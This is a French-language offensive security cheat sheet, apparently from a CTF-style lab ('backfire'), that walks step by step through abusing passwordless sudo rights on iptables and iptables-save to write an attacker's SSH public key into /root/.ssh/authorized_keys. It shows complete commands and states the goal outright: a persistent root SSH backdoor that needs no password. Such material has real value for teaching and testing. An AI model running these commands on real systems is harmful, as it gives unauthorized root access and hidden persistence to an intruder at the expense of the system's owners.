# IPTABLES + IPTABLES-SAVE

Cette technique consiste à détourner deux commandes sudo accessibles (`iptables`, `iptables-save`) pour **injecter une clé SSH dans `/root/.ssh/authorized_keys`**, sans besoin d’accès root direct.

Cela permet de **créer une backdoor SSH persistante** pour l’utilisateur root sans mot de passe.

***

### <mark style="color:red;">🧪</mark> <mark style="color:red;"></mark><mark style="color:red;">**STEPS**</mark>

***

#### <mark style="color:green;">🔹 1.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Lister les commandes sudo disponibles**</mark>

```bash
sudo -l
```

✅ Exemple de sortie :

```
User backfire may run the following commands on backfire:
    (ALL) NOPASSWD: /usr/sbin/iptables, /usr/sbin/iptables-save
```

***

#### <mark style="color:green;">🔹 2.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Générer une paire de clés SSH**</mark>

```bash
ssh-keygen -t ed25519 -f ed_25519
```

✅ Tu obtiens :

* `ed_25519` → **clé privée** (à protéger)
* `ed_25519.pub` → **clé publique** (à injecter)

***

#### <mark style="color:green;">🔹 3.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Utiliser iptables pour injecter la clé publique**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519. user@host'
```
{% endcode %}

***

#### <mark style="color:green;">🔹 4.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Sauvegarder la configuration vers le fichier**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`authorized_keys`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**de root**</mark>

{% code fullWidth="true" %}
```bash
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```
{% endcode %}

***

#### <mark style="color:green;">🔹 5.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Fixer les permissions de ta clé privée**</mark>

```bash
chmod 600 ed_25519
```

***

#### <mark style="color:green;">🔹 6.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Connexion SSH en tant que root**</mark>

```bash
ssh -i ed_25519 root@<host>
```

```
[Sudo access: iptables, iptables-save]
        |
        v
[iptables --comment → inject SSH pubkey]
        |
        v
[iptables-save → write to /root/.ssh/authorized_keys]
        |
        v
[Connexion SSH → root shell 🔥]
```

***
